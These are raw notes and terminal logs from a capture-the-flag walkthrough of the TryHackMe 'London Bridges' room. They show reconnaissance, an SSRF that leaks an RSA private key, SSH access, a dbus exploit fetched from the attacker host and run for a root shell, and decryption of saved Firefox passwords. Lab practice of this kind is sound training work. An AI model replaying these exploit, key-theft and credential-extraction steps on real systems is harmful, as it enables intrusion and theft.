@@ -1,0 +1,486 @@
+THM London Bridges
+
+10.10.154.52
+nmap 10.10.154.52 -sV 
+22/tcp   open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+8080/tcp open  http-proxy gunicorn
+1 service unrecognized despite returning data. If you know the service/version,
+10.10.154.52:8080
+ran gobuster
+ gobuster dir -u http://10.10.154.52:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+ /contact
+/gallery 
+/dejaview
+10.10.154.52:8080/contact
+10.10.154.52:8080/dejaview
+http://10.10.154.52:8080/view_image
+got a SSRF
+localh.st
+om/exploit-database/exploitdb-bin-sploits/-/blob/main/bin-sploits/47165.zip
+
+
+
+oot@ip-10-10-202-145:~# cd root
+bash: cd: root: No such file or directory
+root@ip-10-10-202-145:~# cd /root
+root@ip-10-10-202-145:~# ls
+burp.json   Downloads     Pictures  Rooms    test2
+CTFBuilder  Instructions  Postman   Scripts  thinclient_drives
+Desktop     key           req.txt   test     Tools
+root@ip-10-10-202-145:~# cat key
+HTTP/1.1 200 OK
+Server: gunicorn
+Date: Fri, 27 Sep 2024 18:44:12 GMT
+Connection: close
+Content-Type: text/html; charset=utf-8
+Content-Length: 1675
+
+-----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEAz1yFrg9FAZAI4R37aQWn/ePTk/MKfz2KQ+OE45KErguL34Yj
+5Kc1VJjDTTNRmc+vNRZieC8EwelWgpwcKACa70Ke2q/7zRLWHh23OUxWiSAAORTe
+a1s5eus3ghTWjcfONROAkEg7O3XsNwgp93UUB8wbU+ADpZnFLPUDErFKoSp+dxG4
+rxwqpAp6maqsE4dIZHdAq+Yt6/2HOERKrFWiONQpd6ZA8a325oWXY8UaREvKTuXc
+jlL56t4iWQzsRQbBvB+ETg2ma01u/HmW3M9SyroPypcEOqvPnuPpqXHZu7BwALM5
+NHhXCNmt+0EOBYKvejsDA6NeZfJgw65NVK+2hQIDAQABAoIBACJyZUaoBLegvMjg
+2S32IZUcrr4qJrlCeOCUQDQp196tzlughf/rAwH9qpv9hXW+uYVhJZR/gxPPdm6W
+Dlta1mIeuBLuHy9PDMDOAO0E0G9RIJha7iP5cJAJ2RvD6Gx/H7NTfQz64tQa39W4
+hng0O9KbxoJleVWeONIiFZOaXiJthuro/d9GSivMBJyT8PR3JG6G+R4Qq1tAJqEU
+Hx5DY/U7qVYQ1TE3EfbDR5y0+972fW7J0oZxOuwK6IWP9TtHcPPVIGweaIgZFys3
+3ZFEzON5qRhNdV8lc127cUX5R5hFjn14GHJLpvbjkt8D9DggUKKNR8zPJfIGO5Tp
+gdzclmECgYEA+kaVi0hq1sYSdZL4wHxDQJfGooPn8Hae8zFrsYjrVD8nOQ9NEz4N
+XKqlGMhPc8P0PvuoKy1341ty966S8J+dKfdPzRURFzB84wy3A6CDnViRpCYwKFo0
+Aa5wwpWZalBBpEis0h3YKCKVKyhs4/uN6lMw5H3GaCMdqqm00l9DRm0CgYEA1Bqq
+e2pPYVCwyQb20/8aP305wu6Bdp+i3dUqkHndhPXmEL8EnXbEJuBymn7aKQ3Ln/zX
+8G/7Mze845g93KAPFLeeNk/AmzXKnWB8mgcrFzxAD/wAxH1J9otLvhmX7BRVE6X/
+0he6g1mdtNMXbt0B/aMOS+dCsMW1C/7oUfbxAXkCgYAlCvVvXBSUHVT2Gf6/XqUF
+lnFL9IIL0ULNc+8go8dQ/NftVhpuUqzfnlI5TMyVsdcgy1akrWIlQI/PoQMWokk8
+wOIK1Kdm60JQyLz9yHAyhb1osk5GarNv3EXMRyAh4CcXDbqmjsxDhHrXnHAhfkYO
+/Kkr6IHJQAlQDTY6POdUMQKBgQCPPkMMfkuFyVzbJtzjZ1Futz+fKjw8xKrVbfUF
+BYhZF0h83sRbI65tIv/C3xCu0SZHshaTxsy7VlU2z8ZXjbEhqLAstce6CqX/iv4b
+d+PeGU6afPJ3wLWGz6Qjil1Tjpe2YVFXrbbEpm0fhcA5mwCRLuGk2VXs1Fjk9Q4o
+7MDu4QKBgFIomwhD+jmr3Vc2HutYkl3zliSD239sH3k118sTHbedvKH5Q7nw0C+U
+a7RMp/cXWZKdyRgFxQ7DQEorzWi5bLAyxXnMg0ghwWdf4nugQmaEG7t+OYUNsf7M
+fDLzMA915WcODR6L0mWO0crAMbZQOkg1KlAiwQSQmuUpPqyAfq6x
+-----END RSA PRIVATE KEY-----
+root@ip-10-10-202-145:~# chmod 400 key
+root@ip-10-10-202-145:~# ls
+burp.json   Downloads     Pictures  Rooms    test2
+CTFBuilder  Instructions  Postman   Scripts  thinclient_drives
+Desktop     key           req.txt   test     Tools
+root@ip-10-10-202-145:~# ssh -i beth@10.10.154.52
+Warning: Identity file beth@10.10.154.52 not accessible: No such file or directory.
+usage: ssh [-46AaCfGgKkMNnqsTtVvXxYy] [-b bind_address] [-c cipher_spec]
+           [-D [bind_address:]port] [-E log_file] [-e escape_char]
+           [-F configfile] [-I pkcs11] [-i identity_file]
+           [-J [user@]host[:port]] [-L address] [-l login_name] [-m mac_spec]
+           [-O ctl_cmd] [-o option] [-p port] [-Q query_option] [-R address]
+           [-S ctl_path] [-W host:port] [-w local_tun[:remote_tun]]
+           [user@]hostname [command]
+root@ip-10-10-202-145:~# ssh -i key beth@10.10.154.52
+The authenticity of host '10.10.154.52 (10.10.154.52)' can't be established.
+ECDSA key fingerprint is SHA256:gNAiyzfX8+wrBDSvjfBmqj/xcZYEudxD7mhuK1krTQ0.
+Are you sure you want to continue connecting (yes/no)? yes 
+Warning: Permanently added '10.10.154.52' (ECDSA) to the list of known hosts.
+Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-112-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+Last login: Mon May 13 22:38:30 2024 from 192.168.62.137
+beth@london:~$ ls
+app.py  gunicorn_config.py  index.html  __pycache__  static  templates  uploads
+beth@london:~$ ls -la
+total 72
+drwxr-xr-x 11 beth beth 4096 May  7 06:36 .
+drwxr-xr-x  4 root root 4096 Mar 10  2024 ..
+-rw-rw-r--  1 beth beth 3215 Apr 17 03:44 app.py
+lrwxrwxrwx  1 root root    9 Sep 17  2023 .bash_history -> /dev/null
+-rw-r--r--  1 beth beth  220 Sep 16  2023 .bash_logout
+-rw-r--r--  1 beth beth 3771 Sep 16  2023 .bashrc
+drwx------  4 beth beth 4096 Mar 11  2024 .cache
+drwxrwxr-x  6 beth beth 4096 Sep 17  2023 .env
+drwx------  3 beth beth 4096 Mar 10  2024 .gnupg
+-rw-rw-r--  1 beth beth  328 Apr 17 04:03 gunicorn_config.py
+-rw-r--r--  1 beth beth 1270 Apr 17 05:31 index.html
+drwxrwxr-x  5 beth beth 4096 Mar 11  2024 .local
+-rw-r--r--  1 beth beth  807 Sep 16  2023 .profile
+drwxrwxr-x  2 beth beth 4096 Apr 23 22:15 __pycache__
+-rw-rw-r--  1 root root   66 Sep 18  2023 .selected_editor
+drwx------  2 beth beth 4096 Mar 25  2024 .ssh
+drwxrwxr-x  2 beth beth 4096 Apr 17 05:29 static
+-rw-r--r--  1 beth beth    0 Sep 16  2023 .sudo_as_admin_successful
+drwxrwxr-x  2 beth beth 4096 Apr 17 03:46 templates
+drwxrwxr-x  2 beth beth 4096 Apr 17 04:37 uploads
+beth@london:~$ cd templates
+beth@london:~/templates$ ls
+contact.html  feedback_response.html  index.html  london.html  view.html
+beth@london:~/templates$ cd ..
+beth@london:~$ ls
+app.py  gunicorn_config.py  index.html  __pycache__  static  templates  uploads
+beth@london:~$ grep -iR THM| -c8
+-c8: command not found
+beth@london:~$ ls
+app.py  gunicorn_config.py  index.html  __pycache__  static  templates  uploads
+beth@london:~$ cd __pycache__/
+beth@london:~/__pycache__$ ls
+app.cpython-36.pyc  gunicorn_config.cpython-36.pyc  user.txt
+beth@london:~/__pycache__$ cat user.txt
+THM{l0n6_l1v3_7h3_qu33n}
+beth@london:~/__pycache__$ find / -user root -perm -u=s 2>/dev/null
+/bin/fusermount
+/bin/su
+/bin/ping
+/bin/mount
+/bin/umount
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/vmware-user-suid-wrapper
+/usr/bin/traceroute6.iputils
+/usr/bin/newuidmap
+/usr/bin/sudo
+/usr/bin/newgidmap
+/usr/bin/newgrp
+/usr/bin/chfn
+/usr/bin/chsh
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/share/dbus-1/system-services
+beth@london:~/__pycache__$ ls
+app.cpython-36.pyc  gunicorn_config.cpython-36.pyc  user.txt
+beth@london:~/__pycache__$ uname -r
+4.15.0-112-generic
+beth@london:~/__pycache__$ cd
+beth@london:~$ pwd
+/home/beth
+beth@london:~$ wget http://10.10.154.52:8000dbus.tar
+http://10.10.154.52:8000dbus.tar: Bad port number.
+beth@london:~$ wget http://10.10.154.52:8000/dbus.tar
+--2024-09-27 12:13:34--  http://10.10.154.52:8000/dbus.tar
+Connecting to 10.10.154.52:8000... failed: Connection refused.
+beth@london:~$ wget http://10.10.202.145:8000/dbus.tar
+--2024-09-27 12:14:08--  http://10.10.202.145:8000/dbus.tar
+Connecting to 10.10.202.145:8000... failed: Connection refused.
+beth@london:~$ wget http://10.10.202.145:8000/dbus.tar
+--2024-09-27 12:14:55--  http://10.10.202.145:8000/dbus.tar
+Connecting to 10.10.202.145:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 20480 (20K) [application/x-tar]
+Saving to: \u2018dbus.tar\u2019
+
+dbus.tar            100%[===================>]  20.00K  --.-KB/s    in 0s      
+
+2024-09-27 12:14:55 (161 MB/s) - \u2018dbus.tar\u2019 saved [20480/20480]
+
+beth@london:~$ ls
+app.py    gunicorn_config.py  __pycache__  templates
+dbus.tar  index.html          static       uploads
+beth@london:~$ tar -xvf dbus.tar
+dbus/
+dbus/libsubuid.c
+dbus/rootshell.c
+dbus/subshell.c
+dbus/exploit.dbus.sh
+dbus/subuid_shell.c
+beth@london:~$ ls
+app.py  dbus.tar            index.html   static     uploads
+dbus    gunicorn_config.py  __pycache__  templates
+beth@london:~$ chmod +x exploit.dbus.sh
+chmod: cannot access 'exploit.dbus.sh': No such file or directory
+beth@london:~$ ls
+app.py  dbus.tar            index.html   static     uploads
+dbus    gunicorn_config.py  __pycache__  templates
+beth@london:~$ cd dbus
+beth@london:~/dbus$ ls
+exploit.dbus.sh  libsubuid.c  rootshell.c  subshell.c  subuid_shell.c
+beth@london:~/dbus$ chmod +x exploit.dbus.sh
+beth@london:~/dbus$ ./exploit.dbus.sh 
+[*] Compiling...
+[*] Creating /usr/share/dbus-1/system-services/org.subuid.Service.service...
+[.] starting
+[.] setting up namespace
+[~] done, namespace sandbox set up
+[.] mapping subordinate ids
+[.] subuid: 100000
+[.] subgid: 100000
+[~] done, mapped subordinate ids
+[.] executing subshell
+[*] Creating /etc/dbus-1/system.d/org.subuid.Service.conf...
+[.] starting
+[.] setting up namespace
+[~] done, namespace sandbox set up
+[.] mapping subordinate ids
+[.] subuid: 100000
+[.] subgid: 100000
+[~] done, mapped subordinate ids
+[.] executing subshell
+[*] Launching dbus service...
+Error org.freedesktop.DBus.Error.NoReply: Did not receive a reply. Possible causes include: the remote application did not send a reply, the message bus security policy blocked the reply, the reply timeout expired, or the network connection was broken.
+[+] Success:
+-rwsrwxr-x 1 root root 8392 Sep 27 12:17 /tmp/sh
+[*] Cleaning up...
+[*] Launching root shell: /tmp/sh
+root@london:~/dbus# ls
+exploit.dbus.sh  libsubuid.c  rootshell.c  subshell.c  subuid_shell.c
+root@london:~/dbus# ls -la
+total 32
+drwxr-xr-x  2 beth beth 4096 Sep 27 12:17 .
+drwxr-xr-x 12 beth beth 4096 Sep 27 12:15 ..
+-rwxr-xr-x  1 beth beth 3829 Jul 24  2019 exploit.dbus.sh
+-rwxr-xr-x  1 beth beth  351 Jul 24  2019 libsubuid.c
+-rwxr-xr-x  1 beth beth  143 Jul 24  2019 rootshell.c
+-rwxr-xr-x  1 beth beth 1604 Jul 24  2019 subshell.c
+-rwxr-xr-x  1 beth beth 6065 Jul 24  2019 subuid_shell.c
+root@london:~/dbus#  cd /root
+root@london:/root# ls
+flag.py  flag.pyc  __pycache__  test.py
+root@london:/root# ls -la
+total 52
+drwx------  6 root root 4096 Apr 23 22:10 .
+drwxr-xr-x 23 root root 4096 Apr  7 01:10 ..
+lrwxrwxrwx  1 root root    9 Sep 18  2023 .bash_history -> /dev/null
+-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
+drwx------  3 root root 4096 Apr 23 22:08 .cache
+-rw-r--r--  1 beth beth 2246 Mar 16  2024 flag.py
+-rw-r--r--  1 beth beth 2481 Mar 16  2024 flag.pyc
+drwx------  3 root root 4096 Apr 23 22:08 .gnupg
+drwxr-xr-x  3 root root 4096 Sep 16  2023 .local
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+drwxr-xr-x  2 root root 4096 Mar 16  2024 __pycache__
+-rw-rw-r--  1 root root   27 Sep 18  2023 .root.txt
+-rw-r--r--  1 root root   66 Mar 10  2024 .selected_editor
+-rw-r--r--  1 beth beth  175 Mar 16  2024 test.py
+root@london:/root# cat .root.txt
+THM{l0nd0n_br1d63_p47ch3d}
+root@london:/root# 
+
+
+
+root@ip-10-10-202-145:~# nmap 10.10.154.52 -sV
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2024-09-27 17:46 BST
+Nmap scan report for ip-10-10-154-52.eu-west-1.compute.internal (10.10.154.52)
+Host is up (0.00017s latency).
+Not shown: 998 closed ports
+PORT     STATE SERVICE    VERSION
+22/tcp   open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+8080/tcp open  http-proxy gunicorn
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port8080-TCP:V=7.60%I=7%D=9/27%Time=66F6E17F%P=x86_64-pc-linux-gnu%r(Ge
+SF:tRequest,B15,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x2
+SF:0Fri,\x2027\x20Sep\x202024\x2016:46:54\x20GMT\r\nConnection:\x20close\r
+SF:\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2026
+SF:82\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n\x20\x20\x
+SF:20\x20<meta\x20charset=\"UTF-8\">\n\x20\x20\x20\x20<meta\x20name=\"view
+SF:port\"\x20content=\"width=device-width,\x20initial-scale=1\.0\">\n\x20\
+SF:x20\x20\x20<title>Explore\x20London</title>\n\x20\x20\x20\x20<style>\n\
+SF:x20\x20\x20\x20\x20\x20\x20\x20body\x20{\n\x20\x20\x20\x20\x20\x20\x20\
+SF:x20\x20\x20\x20\x20font-family:\x20Arial,\x20sans-serif;\n\x20\x20\x20\
+SF:x20\x20\x20\x20\x20\x20\x20\x20\x20margin:\x200;\n\x20\x20\x20\x20\x20\
+SF:x20\x20\x20\x20\x20\x20\x20padding:\x200;\n\x20\x20\x20\x20\x20\x20\x20
+SF:\x20\x20\x20\x20\x20background-color:\x20#f2f2f2;\n\x20\x20\x20\x20\x20
+SF:\x20\x20\x20}\n\x20\x20\x20\x20\x20\x20\x20\x20header\x20{\n\x20\x20\x2
+SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20background-color:\x20#333;\n\x20\x
+SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20#fff;\n\x20\x20\x20
+SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x2010px\x2020px;\n\x20\x20
+SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20text-align:\x20center;\n\x20\x2
+SF:0\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20\x20\x20\x20\x20nav\x20{\n\
+SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background-color:\x20#44
+SF:4;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20#fff;\n\x
+SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x2010px\x2020px;
+SF:\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20text-align:\x20center
+SF:;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20\x20\x20\x20\x20n
+SF:av\x20a\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x2
+SF:0#fff;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20text-decoration
+SF::\x20none;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin:\x20
+SF:0\x2010p")%r(HTTPOptions,B3,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunic
+SF:orn\r\nDate:\x20Fri,\x2027\x20Sep\x202024\x2016:46:54\x20GMT\r\nConnect
+SF:ion:\x20close\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nAllow:
+SF:\x20HEAD,\x20OPTIONS,\x20GET\r\nContent-Length:\x200\r\n\r\n");
+MAC Address: 02:52:9C:47:BC:13 (Unknown)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 113.80 seconds
+root@ip-10-10-202-145:~# pip3 install arjun
+Collecting arjun
+  Downloading arjun-2.2.6.tar.gz (140 kB)
+     \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501 140.9/140.9 kB 7.6 MB/s eta 0:00:00
+  Preparing metadata (setup.py) ... done
+Requirement already satisfied: requests in /usr/local/lib/python3.9/dist-packages (from arjun) (2.27.1)
+Collecting dicttoxml
+  Downloading dicttoxml-1.7.16-py3-none-any.whl (24 kB)
+Collecting ratelimit
+  Downloading ratelimit-2.2.1.tar.gz (5.3 kB)
+  Preparing metadata (setup.py) ... done
+Requirement already satisfied: certifi>=2017.4.17 in /usr/lib/python3/dist-packages (from requests->arjun) (2018.1.18)
+Requirement already satisfied: idna<4,>=2.5 in /usr/lib/python3/dist-packages (from requests->arjun) (2.6)
+Requirement already satisfied: urllib3<1.27,>=1.21.1 in /usr/local/lib/python3.9/dist-packages (from requests->arjun) (1.26.14)
+Requirement already satisfied: charset-normalizer~=2.0.0 in /usr/local/lib/python3.9/dist-packages (from requests->arjun) (2.0.12)
+Building wheels for collected packages: arjun, ratelimit
+  Building wheel for arjun (setup.py) ... done
+  Created wheel for arjun: filename=arjun-2.2.6-py3-none-any.whl size=133114 sha256=022eb41811fea15afef9549d916ccda6b9269543f1bffede6d46349f0af66a47
+  Stored in directory: /root/.cache/pip/wheels/29/31/eb/3f01b395a88aed481d5d4e494ba47e5e0988ff8bf72d1ef154
+  Building wheel for ratelimit (setup.py) ... done
+  Created wheel for ratelimit: filename=ratelimit-2.2.1-py3-none-any.whl size=7310 sha256=9d8a8760b98349c3fe0078e0e003225a242fa68a6cf65e5a446a1d40bde50927
+  Stored in directory: /root/.cache/pip/wheels/14/1e/97/126009a0884bdf7e26436cace73d9a4f4596dada4fdc4950ce
+Successfully built arjun ratelimit
+Installing collected packages: ratelimit, dicttoxml, arjun
+Successfully installed arjun-2.2.6 dicttoxml-1.7.16 ratelimit-2.2.1
+WARNING: Running pip as the 'root' user can result in broken permissions and conflicting behaviour with the system package manager. It is recommended to use a virtual environment instead: https://pip.pypa.io/warnings/venv
+WARNING: There was an error checking the latest version of pip.
+root@ip-10-10-202-145:~# arjun -u http://10.10.154.52:8080/view_image -m POST
+    _
+   /_| _ '
+  (  |/ /(//) v2.2.6
+      _/      
+
+[*] Probing the target for stability
+[*] Analysing HTTP response for anomalies
+[*] Analysing HTTP response for potential parameter names
+[+] Heuristic scanner found 1 parameter: image_url
+[*] Logicforcing the URL endpoint
+[\u2713] parameter detected: www, based on: http code
+[\u2713] parameter detected: image_url, based on: body length
+[+] Parameters found: www, image_url
+root@ip-10-10-202-145:~# nano test
+root@ip-10-10-202-145:~# Nano test2
+
+Command 'Nano' not found, did you mean:
+
+  command 'nano' from deb nano
+
+Try: apt install <deb name>
+
+root@ip-10-10-202-145:~# nano test2
+root@ip-10-10-202-145:~# nano test2
+root@ip-10-10-202-145:~# vim req.txt
+root@ip-10-10-202-145:~# vim req.txt
+root@ip-10-10-202-145:~# vim req.txt
+root@ip-10-10-202-145:~# vim req.txt
+root@ip-10-10-202-145:~# vim req.txt
+root@ip-10-10-202-145:~# vim req.txt
+root@ip-10-10-202-145:~# vim req.txt
+root@ip-10-10-202-145:~# vim req.txt
+root@ip-10-10-202-145:~# python3  -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.154.52 - - [27/Sep/2024 20:14:55] "GET /dbus.tar HTTP/1.1" 200 -
+^C
+Keyboard interrupt received, exiting.
+root@ip-10-10-202-145:~# python 3.9 firefox_decrypt.py Downloads/
+/usr/bin/python: can't open file '3.9': [Errno 2] No such file or directory
+root@ip-10-10-202-145:~# python 3.9 firefox_decrypt.py Downloads/firefox.tar .mozilla
+/usr/bin/python: can't open file '3.9': [Errno 2] No such file or directory
+root@ip-10-10-202-145:~# python 3.9 firefox_decrypt.py Downloads/.mozilla/firefox/8k3bf3zp.charles/
+/usr/bin/python: can't open file '3.9': [Errno 2] No such file or directory
+root@ip-10-10-202-145:~# python3.9 firefox_decrypt.py Downloads/.mozilla/firefox/8k3bf3zp.charles/py
+2024-09-27 20:37:39,676 - WARNING - profile.ini not found in Downloads/.mozilla/firefox/8k3bf3zp.charles/py
+2024-09-27 20:37:39,677 - WARNING - Continuing and assuming 'Downloads/.mozilla/firefox/8k3bf3zp.charles/py' is a profile location
+2024-09-27 20:37:39,677 - ERROR - Profile location 'Downloads/.mozilla/firefox/8k3bf3zp.charles/py' is not a directory
+root@ip-10-10-202-145:~# install python3
+install: missing destination file operand after 'python3'
+Try 'install --help' for more information.
+root@ip-10-10-202-145:~# apt install python3
+Reading package lists... Done
+Building dependency tree       
+Reading state information... Done
+python3 is already the newest version (3.6.7-1~18.04).
+The following packages were automatically installed and are no longer required:
+  docutils-common gir1.2-goa-1.0 gir1.2-snapd-1 libpkcs11-helper1
+  linux-headers-4.15.0-115 linux-headers-4.15.0-115-generic
+  linux-image-4.15.0-115-generic linux-modules-4.15.0-115-generic
+  linux-modules-extra-4.15.0-115-generic python-bs4 python-chardet
+  python-dicttoxml python-dnspython python-html5lib python-jsonrpclib
+  python-lxml python-mechanize python-olefile python-pypdf2 python-slowaes
+  python-webencodings python-xlsxwriter python3-botocore python3-docutils
+  python3-jmespath python3-pygments python3-roman python3-rsa
+  python3-s3transfer
+Use 'apt autoremove' to remove them.
+0 to upgrade, 0 to newly install, 0 to remove and 355 not to upgrade.
+root@ip-10-10-202-145:~# python3 firefox_decrypt.py Downloads/.mozilla/firefox/8k3bf3zp.charles/py
+  File "firefox_decrypt.py", line 19
+    from __future__ import annotations
+    ^
+SyntaxError: future feature annotations is not defined
+root@ip-10-10-202-145:~# ls
+47165.zip              dbus.tar            key            Rooms
+47167.sh               Desktop             __MACOSX       Scripts
+burp.json              Downloads           Pictures       test
+Chinook_Sqlite.sqlite  firefox_decrypt.py  places.sqlite  test2
+CTFBuilder             firefox.tar         Postman        thinclient_drives
+dbus                   Instructions        req.txt        Tools
+root@ip-10-10-202-145:~# python3 firefox_decrypt.py 
+  File "firefox_decrypt.py", line 19
+    from __future__ import annotations
+    ^
+SyntaxError: future feature annotations is not defined
+root@ip-10-10-202-145:~# ls
+47165.zip              dbus.tar            key            Rooms
+47167.sh               Desktop             __MACOSX       Scripts
+burp.json              Downloads           Pictures       test
+Chinook_Sqlite.sqlite  firefox_decrypt.py  places.sqlite  test2
+CTFBuilder             firefox.tar         Postman        thinclient_drives
+dbus                   Instructions        req.txt        Tools
+root@ip-10-10-202-145:~# python3.6 firefox_decrypt.py Downloads/
+  File "firefox_decrypt.py", line 19
+    from __future__ import annotations
+    ^
+SyntaxError: future feature annotations is not defined
+root@ip-10-10-202-145:~# ls
+47165.zip              dbus.tar            key            Rooms
+47167.sh               Desktop             __MACOSX       Scripts
+burp.json              Downloads           Pictures       test
+Chinook_Sqlite.sqlite  firefox_decrypt.py  places.sqlite  test2
+CTFBuilder             firefox.tar         Postman        thinclient_drives
+dbus                   Instructions        req.txt        Tools
+root@ip-10-10-202-145:~# python3 firefox_decrypt.py Downloads/
+  File "firefox_decrypt.py", line 19
+    from __future__ import annotations
+    ^
+SyntaxError: future feature annotations is not defined
+root@ip-10-10-202-145:~# python3.9 firefox_decrypt.py Downloads/
+2024-09-27 20:43:13,911 - WARNING - profile.ini not found in Downloads/
+2024-09-27 20:43:13,913 - WARNING - Continuing and assuming 'Downloads/' is a profile location
+2024-09-27 20:43:13,947 - ERROR - Couldn't initialize NSS, maybe 'Downloads/' is not a valid profile?
+root@ip-10-10-202-145:~# apt install python3.9
+Reading package lists... Done
+Building dependency tree       
+Reading state information... Done
+python3.9 is already the newest version (3.9.16-1+bionic1).
+The following packages were automatically installed and are no longer required:
+  docutils-common gir1.2-goa-1.0 gir1.2-snapd-1 libpkcs11-helper1
+  linux-headers-4.15.0-115 linux-headers-4.15.0-115-generic
+  linux-image-4.15.0-115-generic linux-modules-4.15.0-115-generic
+  linux-modules-extra-4.15.0-115-generic python-bs4 python-chardet
+  python-dicttoxml python-dnspython python-html5lib python-jsonrpclib
+  python-lxml python-mechanize python-olefile python-pypdf2 python-slowaes
+  python-webencodings python-xlsxwriter python3-botocore python3-docutils
+  python3-jmespath python3-pygments python3-roman python3-rsa
+  python3-s3transfer
+Use 'apt autoremove' to remove them.
+0 to upgrade, 0 to newly install, 0 to remove and 355 not to upgrade.
+root@ip-10-10-202-145:~# python3.9 firefox_decrypt.py Downloads/
+2024-09-27 20:43:40,714 - WARNING - profile.ini not found in Downloads/
+2024-09-27 20:43:40,714 - WARNING - Continuing and assuming 'Downloads/' is a profile location
+2024-09-27 20:43:40,715 - ERROR - Couldn't initialize NSS, maybe 'Downloads/' is not a valid profile?
+root@ip-10-10-202-145:~# python3.9 firefox_decrypt.py Downloads/
+2024-09-27 20:44:13,159 - WARNING - profile.ini not found in Downloads/
+2024-09-27 20:44:13,160 - WARNING - Continuing and assuming 'Downloads/' is a profile location
+2024-09-27 20:44:13,161 - ERROR - Couldn't initialize NSS, maybe 'Downloads/' is not a valid profile?
+root@ip-10-10-202-145:~# mv firefox_decrypt.py /root/Downloads/.mozilla/firefox/8k3bf3zp.charles
+root@ip-10-10-202-145:~# python3.9 firefox_decrypt.py Downloads/.mozilla/firefox/8k3bf3zp.charles/
+2024-09-27 20:51:58,792 - WARNING - profile.ini not found in Downloads/.mozilla/firefox/8k3bf3zp.charles/
+2024-09-27 20:51:58,792 - WARNING - Continuing and assuming 'Downloads/.mozilla/firefox/8k3bf3zp.charles/' is a profile location
+
+Website:   https://www.buckinghampalace.com
+Username: 'Charles'
+Password: 'thekingofengland'
+
+
+
+
